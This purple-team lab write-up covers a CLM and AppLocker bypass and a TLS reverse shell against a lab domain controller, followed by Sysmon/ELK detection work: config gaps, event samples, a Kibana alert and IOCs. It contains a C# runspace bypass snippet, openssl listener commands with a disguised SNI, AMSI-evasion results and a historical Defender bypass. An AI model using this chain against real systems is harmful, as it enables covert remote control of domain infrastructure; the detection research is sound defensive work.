# CLM Bypass + TLS Reverse Shell: Purple Team Detection Lab
**Date:** 2026-03-23  
**Author:** Osher Jacobs  
**Repository:** [osherjacobs/AD-Lab-Research](https://github.com/osherjacobs/AD-Lab-Research)

---

## Overview

End-to-end purple team exercise: establish an encrypted reverse shell via CLM bypass on a Windows Server 2019 Domain Controller, capture the full attack chain in ELK via Sysmon and Winlogbeat, identify configuration gaps in default monitoring rules, and build a live Kibana detection alert from empirical telemetry.

Tested against both Windows 11 Enterprise (December 2025) and Windows Server 2019 (March 2026 lab). See [December 2025 historical note](#december-2025-defender-bypass--historical-reference) for AV evasion results under the earlier build.

---

## Environment

| Component | Details |
|---|---|
| Target (current lab) | Windows Server 2019 — DC01.lab2019.local (192.168.1.4) |
| Target (December 2025) | Windows 11 Enterprise — fully patched at time of test |
| Attacker | Kali Linux (192.168.1.218) |
| SIEM | ELK stack (192.168.1.250) |
| Log shipper | Winlogbeat 8.19.12 |
| Sysmon | v15.15, SwiftOnSecurity config (modified — see below) |
| AV state | Defender disabled for lab execution phase (Server 2019) |

---

## Attack Chain

### 1. CLM Bypass — Custom C# Runspace

PowerShell ConstrainedLanguage Mode (CLM) is enforced system-wide via AppLocker policy. CLM enforcement lives in the PowerShell host process — programmatically created runspaces default to FullLanguage and do not inherit the system policy.

Bypass achieved by compiling a .NET Framework 4.8 C# binary that creates a FullLanguage runspace via `RunspaceFactory.CreateRunspace()`. No configuration required. The TLS reverse shell payload is embedded as a hardcoded string — no ps1 written to disk.

```csharp
Runspace runspace = RunspaceFactory.CreateRunspace();
runspace.Open();
PowerShell ps = PowerShell.Create();
ps.Runspace = runspace;
ps.AddScript(payload);
ps.Invoke();
runspace.Close();
```

**Verified post-shell:**
```
SHELL> $ExecutionContext.SessionState.LanguageMode
FullLanguage
```

CLM bypass via custom runspace is architectural — Microsoft does not treat it as a security boundary and issues no patches for it. This technique remains unpatched by design.

---

### 2. AppLocker Bypass — Execution from C:\Windows\Tasks

AppLocker blocked execution from standard user-writable paths (Desktop, Downloads). `C:\Windows\Tasks` satisfies two conditions simultaneously:

- Writable by standard users in many default configurations
- Falls within the `%WINDIR%\*` allowed path in default AppLocker executable rules

This is not obscure tradecraft. `C:\Windows\Tasks` as an AppLocker bypass has been publicly documented for years and appears in every AppLocker bypass reference. It works on default configurations in 2026. The fact that it remains unaddressed in default deployments is, to put it plainly, indefensible — analogous to the years-long window between ADCS ESC vulnerabilities being known and organizations actually closing them. Any allow rule scoped broadly to %WINDIR% implicitly trusts legacy writable subpaths.

Binary copied to `C:\Windows\Tasks\` and executed successfully.

---

### 3. TLS Reverse Shell — Encrypted C2 Channel

Reverse shell payload embedded in C# binary. TLS encrypts the channel and blends with legitimate HTTPS traffic.

**Listener (Kali):**
```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=cloudflare-dns.com"
openssl s_server -quiet -key key.pem -cert cert.pem -port 443
```

**Key characteristics:**
- SNI set to `cloudflare-dns.com` — mimics DNS-over-HTTPS traffic on port 443
- Self-signed cert accepted via disabled validation callback
- Connection made directly by IP — no DNS resolution occurs
- Payload never exists as a file on disk

**Shell confirmed on DC01 (Server 2019):**
```
SHELL> whoami
lab2019\administrator
SHELL> hostname
DC01
SHELL> $ExecutionContext.SessionState.LanguageMode
FullLanguage
```

---

## AMSI Findings

With Defender enabled, all payload variants were blocked before execution on both Windows 11 Enterprise and Windows Server 2019 (March 2026):

| Attempt | Detection | Notes |
|---|---|---|
| Plaintext ps1 | `Trojan:PowerShell/ReverseShell.HAB!MTB` | Static signature on TLS shell content |
| Embedded payload in C# binary | `Trojan:PowerShell/ReverseShell.HAB!MTB` | AMSI scanning decoded PS string at parse time |
| Split-string AMSI bypass prepended | Caught at AMSI bypass line | Signature on `AmsiUtils`/`amsiInitFailed` pattern |
| P/Invoke `AmsiScanBuffer` patch | `VirTool:MSIL/AmsiTamper.C` | Caught at binary copy — static signature on patch bytes |

**Finding:** The C# vehicle itself evades detection. It is the embedded PowerShell payload that is signatured. The CLM bypass mechanism remains clean — it is the PS content that Microsoft now recognises. All publicly documented AMSI bypass techniques tested were blocked on fully patched systems as of March 2026.

See [December 2025 historical note](#december-2025-defender-bypass--historical-reference) for context on why this worked three months ago.

---

## Detection Telemetry — ELK

### Critical Finding: Default Sysmon Config Gap

The SwiftOnSecurity Sysmon configuration — the de facto standard deployment baseline used by the majority of Sysmon deployments — includes the following `NetworkConnect` include rule:

```xml
<NetworkConnect onmatch="include">
    <Image name="Usermode" condition="begin with">C:\Users</Image>
    ...
</NetworkConnect>
```

Execution from `C:\Windows\Tasks\` falls entirely outside this include rule. **No EID 3 network connection events were generated until the config was manually updated.**

This is the same gap that makes `C:\Windows\Tasks` valuable as an AppLocker bypass in the first place — and it propagates directly into the monitoring layer. One path choice defeats AppLocker execution controls *and* Sysmon network telemetry simultaneously. `C:\Windows\Tasks` has been a documented AppLocker bypass for years. The absence of this path from the standard Sysmon NetworkConnect rules is a gap that should not exist in 2026.

**Config fix — one line:**
```xml
<NetworkConnect onmatch="include">
    <Image name="Usermode" condition="begin with">C:\Users</Image>
    <Image name="Tasks" condition="begin with">C:\Windows\Tasks</Image>
    ...
</NetworkConnect>
```

If you are running the SwiftOnSecurity config unmodified, you are blind to network connections originating from this execution path. Check your config.

---

### EID 1 — Process Create

```
Image:              C:\Windows\Tasks\CLMBypassa.exe
ParentImage:        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine:  powershell -ep bypass
User:               LAB2019\Administrator
IntegrityLevel:     High
CurrentDirectory:   C:\Windows\Tasks\
Company:            -
MD5:                401488CAACAB52DFDBC9C69BCEB93007
SHA256:             0B0A0BEF9DE5B6773CA209F7008FCDEBEC15E823D5A90A04A08DD24F1AE73EB3
```

**Detection signals:**
- Executable in `C:\Windows\Tasks\` — not a legitimate binary location
- No Company/Publisher field — unsigned binary
- Parent process `powershell -ep bypass` — high-signal parent chain
- High integrity context under administrator account

---

### EID 3 — Network Connection (post config fix)

```
Image:                C:\Windows\Tasks\CLMBypassa.exe
DestinationIp:        192.168.1.218
DestinationPort:      443
DestinationHostname:  -
SourceIp:             192.168.1.4
Protocol:             tcp
Initiated:            true
RuleName:             Tasks
```

**Detection signals:**
- Outbound 443 from unsigned binary in `C:\Windows\Tasks\`
- `DestinationHostname` empty — direct IP connection, no DNS resolution
- No corresponding EID 22 DNS query preceding the connection
- `cloudflare-dns.com` SNI against a private RFC1918 destination — immediate anomaly in Zeek `ssl.log`

The SNI/RFC1918 mismatch is the highest-confidence network IOC. A TLS connection advertising `cloudflare-dns.com` terminating at a private IP address is not legitimate traffic under any normal operating condition.

---

### Kibana Alert

Alert built directly from empirical lab telemetry and deployed as a live detection rule in ELK Security.

**Rule configuration:**
```
Name:        Sysmon - Binary Execution from Windows Tasks
Type:        Custom Query
Severity:    High
Risk Score:  73
Schedule:    Every 5 minutes
Tags:        Sysmon, AppLocker-Bypass, Defense-Evasion
Description: Detects binary execution from C:\Windows\Tasks - a well-documented 
             AppLocker bypass path. Any execution from this location should be 
             treated as suspicious.

Query:
event.provider: "Microsoft-Windows-Sysmon" 
AND event.code: 1 
AND winlog.event_data.CurrentDirectory: "C:\\Windows\\Tasks\\"
```

**Alert firing — key fields from triggered event:**

```
winlog.event_data.ParentImage:        C:\Windows\Tasks\CLMBypassa.exe
winlog.event_data.ParentCommandLine:  "C:\Windows\Tasks\CLMBypassa.exe"
winlog.event_data.CurrentDirectory:   C:\Windows\Tasks\
winlog.event_data.IntegrityLevel:     High
winlog.event_data.User:               LAB2019\Administrator
kibana.alert.rule.name:               Sysmon - Binary Execution from Windows Tasks
kibana.alert.severity:                high
kibana.alert.risk_score:              73
kibana.alert.status:                  active
```

4 high-severity alerts fired. Notably, the rule caught child process activity (`ipconfig.exe`) spawned by `CLMBypassa.exe` — demonstrating detection one level deeper than the initial execution event. The parent-child relationship is fully preserved in the telemetry.

---

### Kibana Queries

```
# Process creation from Tasks
event.provider: "Microsoft-Windows-Sysmon" AND event.code: 1 AND winlog.event_data.Image: *CLMBypass*

# Network connection from Tasks
event.provider: "Microsoft-Windows-Sysmon" AND event.code: 3 AND winlog.event_data.Image: *CLMBypass*

# Broad: any binary in Tasks making network connections
event.provider: "Microsoft-Windows-Sysmon" AND event.code: 3 AND winlog.event_data.Image: *Windows\\Tasks*

# Outbound 443 with no destination hostname resolution
event.provider: "Microsoft-Windows-Sysmon" AND event.code: 3 AND winlog.event_data.DestinationPort: 443 AND winlog.event_data.DestinationHostname: "-"
```

---

## Detection Summary

| Layer | Signal | Status |
|---|---|---|
| Defender AV | `Trojan:PowerShell/ReverseShell.HAB!MTB` | Fired — blocked execution |
| Sysmon EID 1 | Unsigned binary from `C:\Windows\Tasks\` spawned by `powershell -ep bypass` | Captured |
| Sysmon EID 3 | Outbound 443 to private IP, no hostname resolution | Captured (after config fix) |
| Kibana Alert | `Sysmon - Binary Execution from Windows Tasks` — 4 high alerts | Fired |
| Zeek ssl.log | SNI `cloudflare-dns.com` → RFC1918 destination | Expected — not verified this session |
| Sysmon EID 7 | `amsi.dll` / `SMA.dll` load by non-standard host | Not captured — ImageLoad disabled in config |
| PowerShell EID 4104 | ScriptBlock logging from custom runspace | Not verified — separate test warranted |

**Key finding:** The SIEM captured the full attack chain regardless of whether the payload executed. Detection does not depend on evasion success. Blocked attempts and successful execution produce the same telemetry footprint.

---

## Configuration Gaps Identified

1. **Default Sysmon NetworkConnect rule** — `C:\Windows\Tasks\` absent from include rules despite being a well-documented AppLocker bypass path for years. One-line fix. No excuse for this gap in production deployments.
2. **Sysmon ImageLoad disabled** — `amsi.dll` and `System.Management.Automation.dll` load events not captured. Enabling EID 7 adds DLL load chain visibility from non-standard host processes.
3. **EID 4104 ScriptBlock logging** — behaviour of custom runspace against ScriptBlock logging policy not verified. Separate test warranted.
4. **Zeek SNI correlation** — not verified this session. High-confidence IOC available: `cloudflare-dns.com` SNI against RFC1918 destination in `ssl.log`.

---

## IOCs

| Type | Value |
|---|---|
| SHA256 | `0B0A0BEF9DE5B6773CA209F7008FCDEBEC15E823D5A90A04A08DD24F1AE73EB3` |
| MD5 | `401488CAACAB52DFDBC9C69BCEB93007` |
| Execution path | `C:\Windows\Tasks\*.exe` |
| TLS SNI | `cloudflare-dns.com` → RFC1918 destination |
| Network | Outbound TCP/443 from `C:\Windows\Tasks\` with no hostname resolution |

---

## December 2025 Defender Bypass — Historical Reference

**Date:** 2025-12-24  
**Platform:** Windows 11 Enterprise — fully patched at time of test  
**Defender state:** Real-time protection, cloud-delivered protection, Dev Drive protection, and tamper protection all ON  

### What Worked

Same CLM bypass binary used as execution vehicle. Payload sourced from revshells.com — PowerShell TLS reverse shell #4, base64-encoded UTF-8, passed as a command-line argument. No AMSI bypass prepended. No obfuscation beyond base64 encoding.

```
.\CLMBypass.exe <base64_encoded_tls_shell>
```

Shell landed. Confirmed:

```
SHELL> $ExecutionContext.SessionState.LanguageMode
FullLanguage
SHELL> whoami
desktop-rd3160s\oj
```

Windows Security panel confirmed all four Defender protection layers active during the shell session. Screenshot retained.

### Controlled Variable Test — March 2026

Original December binary redeployed unchanged on both Windows 11 Enterprise and Windows Server 2019 in March 2026. Blocked immediately on both — `Trojan:PowerShell/ReverseShell.HAB!MTB`.

Same binary. Same payload. Different result 90 days later.

### Analysis

The CLM bypass mechanism is unchanged and unpatched — it remains architectural. The C# vehicle itself still evades detection. It is the embedded PowerShell payload that Microsoft signatured between December 2025 and March 2026.

The revshells.com TLS shell pattern was not in Defender's signature database in December 2025. It is now. Offensive tooling has a shelf life. The ~90-day window this technique remained viable is a data point worth recording.

**Detection layer conclusion:** ELK captured the full attack chain in both scenarios. The SIEM is indifferent to whether evasion succeeds. The kill chain is visible either way.

---

*Isolated lab environment. Windows Server 2019 DC and Windows 11 Enterprise VM. No production systems involved.*
